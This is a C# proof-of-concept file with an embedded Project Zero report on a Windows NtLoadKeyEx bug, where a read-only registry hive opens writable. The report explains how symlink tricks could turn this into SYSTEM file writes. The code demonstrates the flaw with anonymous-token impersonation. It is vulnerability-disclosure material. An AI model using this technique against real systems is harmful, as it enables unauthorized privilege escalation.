/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=871

Windows: NtLoadKeyEx Read Only Hive Arbitrary File Write EoP
Platform: Windows 10 10586 not tested 8.1 Update 2 or Windows 7
Class: Elevation of Privilege

Summary:
NtLoadKeyEx takes a flag to open a registry hive read only, if one of the hive files cannot be opened for read access it will revert to write mode and also impersonate the calling process. This can leading to EoP if a user controlled hive is opened in a system service.

Description:

One of the flags to NtLoadKeyEx is to open a registry hive with read only access. When this flag is passed the main hive file is opened for Read only, and no log files are opened or created. However there’s a bug in the kernel function CmpCmdHiveOpen, initially it calls CmpInitHiveFromFile passing flag 1 in the second parameter which means open read-only. However if this fails with a number of error codes, including STATUS_ACCESS_DENIED it will recall the initialization function while impersonating the calling process, but it forgets to pass the read only flag. This means if the initial access fails, it will instead open the hive in write mode which will create the log files etc.

An example where this is used is in the WinRT COM activation routines of RPCSS. The GetPrivateHiveKeyFromPackageFullName method explicitly calls NtLoadKeyEx with the read only flag (rather than calling RegLoadAppKey which will not). As this is opening a user ActivationStore.dat hive inside the AppData\Local\Packages directory in the user’s profile it’s possible to play tricks with symbolic links to cause the opening of the hive inside the DCOM service to fail as the normal user then write the log files out as SYSTEM (as it calls RtlImpersonateSelfEx). 

This is made all the worse because of the behaviour of the file creation routines. When the log files are being created the kernel copies the DACL from the main hive file to the new log files. This means that although we don’t really control the log file contents we can redirect the write to an arbitrary location (and using symlink tricks ensure the name is suitable) then reopen the file as it has an explicit DACL copied from the main hive we control and we can change the file’s contents to whatever you like. 

Proof of Concept:

I’ve provided a PoC as a C# source code file. You need to compile it first targetted .NET 4 and above. I’ve verified you can exploit RPCSS manually, however without substantial RE it wouldn’t be a very reliable PoC, so instead I’ve just provided an example file you can fun as a normal user. This will impersonate the anonymous token while opening the hive (which in reality would be DACL’ed to block the user from opening for read access) and we verify that the log files are created. 

1) Compile the C# source code file.
2) Execute the PoC executable as a normal user.
3) The PoC should print that it successfully opened the hive in write mode.

Expected Result:
The hive fails to open, or at least only opens in read-only mode.

Observed Result:
The hive is opened in write mode incorrectly which can be abused to elevate privileges. 
*/

using Microsoft.Win32;
using Microsoft.Win32.SafeHandles;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace PoC_NtLoadKeyEx_ReadOnlyFlag_EoP
{
  class Program
  {
    [Flags]
    public enum AttributeFlags : uint
    {
      None = 0,
      Inherit = 0x00000002,
      Permanent = 0x00000010,
      Exclusive = 0x00000020,
      CaseInsensitive = 0x00000040,
      OpenIf = 0x00000080,
      OpenLink = 0x00000100,
      KernelHandle = 0x00000200,
      ForceAccessCheck = 0x00000400,
      IgnoreImpersonatedDevicemap = 0x00000800,
      DontReparse = 0x00001000,
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public sealed class UnicodeString
    {
      ushort Length;
      ushort MaximumLength;
      [MarshalAs(UnmanagedType.LPWStr)]
      string Buffer;

      public UnicodeString(string str)
      {
        Length = (ushort)(str.Length * 2);
        MaximumLength = (ushort)((str.Length * 2) + 1);
        Buffer = str;
      }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public sealed class ObjectAttributes : IDisposable
    {
      int Length;
      IntPtr RootDirectory;
      IntPtr ObjectName;
      AttributeFlags Attributes;
      IntPtr SecurityDescriptor;
      IntPtr SecurityQualityOfService;

      private static IntPtr AllocStruct(object s)
      {
        int size = Marshal.SizeOf(s);
        IntPtr ret = Marshal.AllocHGlobal(size);
        Marshal.StructureToPtr(s, ret, false);
        return ret;
      }

      private static void FreeStruct(ref IntPtr p, Type struct_type)
      {
        Marshal.DestroyStructure(p, struct_type);
        Marshal.FreeHGlobal(p);
        p = IntPtr.Zero;
      }

      public ObjectAttributes(string object_name)
      {
        Length = Marshal.SizeOf(this);
        if (object_name != null)
        {
          ObjectName = AllocStruct(new UnicodeString(object_name));
        }
        Attributes = AttributeFlags.None;
      }

      public void Dispose()
      {
        if (ObjectName != IntPtr.Zero)
        {
          FreeStruct(ref ObjectName, typeof(UnicodeString));
        }
        GC.SuppressFinalize(this);
      }

      ~ObjectAttributes()
      {
        Dispose();
      }
    }

    [Flags]
    public enum LoadKeyFlags
    {
      None = 0,
      AppKey = 0x10,
      Exclusive = 0x20,
      Unknown800 = 0x800,
      ReadOnly = 0x2000,
    }

    [Flags]
    public enum GenericAccessRights : uint
    {
      None = 0,
      GenericRead = 0x80000000,
      GenericWrite = 0x40000000,
      GenericExecute = 0x20000000,
      GenericAll = 0x10000000,
      Delete = 0x00010000,
      ReadControl = 0x00020000,
      WriteDac = 0x00040000,
      WriteOwner = 0x00080000,
      Synchronize = 0x00100000,
      MaximumAllowed = 0x02000000,
    }

    public class NtException : ExternalException
    {
      [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
      private static extern IntPtr GetModuleHandle(string modulename);

      [Flags]
      enum FormatFlags
      {
        AllocateBuffer = 0x00000100,
        FromHModule = 0x00000800,
        FromSystem = 0x00001000,
        IgnoreInserts = 0x00000200
      }

      [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
      private static extern int FormatMessage(
        FormatFlags dwFlags,
        IntPtr lpSource,
        int dwMessageId,
        int dwLanguageId,
        out IntPtr lpBuffer,
        int nSize,
        IntPtr Arguments
      );

      [DllImport("kernel32.dll")]
      private static extern IntPtr LocalFree(IntPtr p);

      private static string StatusToString(int status)
      {
        IntPtr buffer = IntPtr.Zero;
        try
        {
          if (FormatMessage(FormatFlags.AllocateBuffer | FormatFlags.FromHModule | FormatFlags.FromSystem | FormatFlags.IgnoreInserts,
              GetModuleHandle("ntdll.dll"), status, 0, out buffer, 0, IntPtr.Zero) > 0)
          {
            return Marshal.PtrToStringUni(buffer);
          }
        }
        finally
        {
          if (buffer != IntPtr.Zero)
          {
            LocalFree(buffer);
          }
        }
        return String.Format("Unknown Error: 0x{0:X08}", status);
      }

      public NtException(int status) : base(StatusToString(status))
      {
      }
    }

    public static void StatusToNtException(int status)
    {
      if (status < 0)
      {
        throw new NtException(status);
      }
    }    

    [DllImport("Advapi32.dll")]
    static extern bool ImpersonateAnonymousToken(
      IntPtr ThreadHandle);

    [DllImport("Advapi32.dll")]
    static extern bool RevertToSelf();

    [DllImport("ntdll.dll")]
    public static extern int NtLoadKeyEx(ObjectAttributes DestinationName, ObjectAttributes FileName, LoadKeyFlags Flags,
        IntPtr TrustKeyHandle, IntPtr EventHandle, GenericAccessRights DesiredAccess, out SafeRegistryHandle KeyHandle, int Unused);

    static RegistryKey LoadKey(string path, bool read_only)
    {
      string reg_name = @"\Registry\A\" + Guid.NewGuid().ToString("B");
      ObjectAttributes KeyName = new ObjectAttributes(reg_name);
      ObjectAttributes FileName = new ObjectAttributes(@"\??\" + path);
      SafeRegistryHandle keyHandle;
      LoadKeyFlags flags = LoadKeyFlags.AppKey;
      if (read_only)
        flags |= LoadKeyFlags.ReadOnly;

      int status = NtLoadKeyEx(KeyName,
        FileName, flags, IntPtr.Zero,
        IntPtr.Zero, GenericAccessRights.GenericRead, out keyHandle, 0);
      if (status != 0)
        return null;
      return RegistryKey.FromHandle(keyHandle);      
    }

    static bool CheckForLogs(string path)
    {
      return File.Exists(path + ".LOG1") || File.Exists(path + ".LOG2");
    }

    static void DoExploit()
    {
      string path = Path.GetFullPath("dummy.hiv");
      RegistryKey key = LoadKey(path, false);      
      if (key == null)
      {
        throw new Exception("Something went wrong, couldn't create dummy hive");
      }
      key.Close();
      
      // Ensure the log files are deleted.
      File.Delete(path + ".LOG1");
      File.Delete(path + ".LOG2");
      if (CheckForLogs(path))
      {
        throw new Exception("Couldn't delete log files");
      }

      key = LoadKey(path, true);
      if (key == null || CheckForLogs(path))
      {
        throw new Exception("Didn't open hive readonly");
      }
      key.Close();

      ImpersonateAnonymousToken(new IntPtr(-2));
      key = LoadKey(path, true);
      RevertToSelf();
      if (!CheckForLogs(path))
      {
        throw new Exception("Log files not recreated");
      }

      Console.WriteLine("[SUCCESS]: Read Only Hive Opened with Write Access");
    }

    static void Main(string[] args)
    {
      try
      {
        DoExploit();        
      }
      catch (Exception ex)
      {
        Console.WriteLine("[ERROR]: {0}", ex.Message);
      }
    }
  }
}
